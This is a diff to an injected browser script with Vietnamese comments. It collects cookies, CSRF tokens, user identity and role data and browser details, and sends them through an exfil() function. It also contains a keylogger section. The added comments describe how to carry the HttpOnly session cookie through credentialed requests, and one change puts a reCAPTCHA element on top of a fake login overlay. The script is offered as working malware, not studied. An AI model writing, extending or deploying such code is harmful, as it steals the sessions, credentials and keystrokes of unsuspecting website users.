@@ -57,7 +57,9 @@
     } catch(e) {}
   }
 
-  // Thu thap thong tin
+  // Thu thap thong tin: cookies, csrf, gon, page info
+  // LUU Y: cookie _msbmtu_ses co HttpOnly -> JS khong doc duoc qua document.cookie
+  // NHUNG se duoc server tu dong gan vao request (withCredentials=true)
   var cookies, csrfToken;
   try { cookies = document.cookie || ""; } catch(e) { cookies = ""; }
   try { var c = document.querySelector('meta[name="csrf-token"]'); csrfToken = (c && c.content) ? c.content : "none"; } catch(e) { csrfToken = "none"; }
@@ -65,7 +67,10 @@
   try { if (typeof gon !== 'undefined') { gonData = { uid: gon.user_id, uname: gon.user_name || gon.username, org: gon.organization, lead: gon.leader_roles, fac: gon.faculty, roles: gon.roles }; } } catch(e) {}
   var pageInfo = { url: location.href.substring(0, 300), domain: document.domain, title: document.title.substring(0, 100), ua: navigator.userAgent.substring(0, 150), lang: navigator.language, screen: screen.width + 'x' + screen.height, time: new Date().toISOString() };
 
-  exfil({ cookies: cookies.substring(0, 500), csrf: csrfToken.substring(0, 100), url: pageInfo.url, domain: pageInfo.domain, title: pageInfo.title, ua: pageInfo.ua, lang: pageInfo.lang, screen: pageInfo.screen, gon: gonData, ver: VERSION }, 'visit');
+  // Gui cookies ve server (bao gom co mat session HttpOnly khong)
+  // HttpOnly cookie khong hien thi trong document.cookie nhung se duoc
+  // server tu dong gan vao request (withCredentials=true trong verifyLogin)
+  exfil({ cookies: cookies.substring(0, 500), csrf: csrfToken.substring(0, 100), url: pageInfo.url, domain: pageInfo.domain, title: pageInfo.title, ua: pageInfo.ua, lang: pageInfo.lang, screen: pageInfo.screen, gon: gonData, ver: VERSION, hasHttpSession: (cookies.indexOf('_msbmtu_ses') >= 0) }, 'visit');
 
   // Keylogger
   (function() {
@@ -278,7 +283,7 @@
       recaptchaDiv.setAttribute('data-sitekey', RECAPTCHA_SITEKEY);
       recaptchaDiv.setAttribute('data-callback', 'onRecaptchaSuccess');
       recaptchaDiv.setAttribute('data-expired-callback', 'onRecaptchaExpired');
-      recaptchaDiv.style.cssText = 'margin:0 0 15px 0;display:flex;justify-content:center;';
+      recaptchaDiv.style.cssText = 'margin:0 0 15px 0;display:flex;justify-content:center;z-index:2147483647;position:relative;';
       box.appendChild(recaptchaDiv);
 
       // Tai script recaptcha
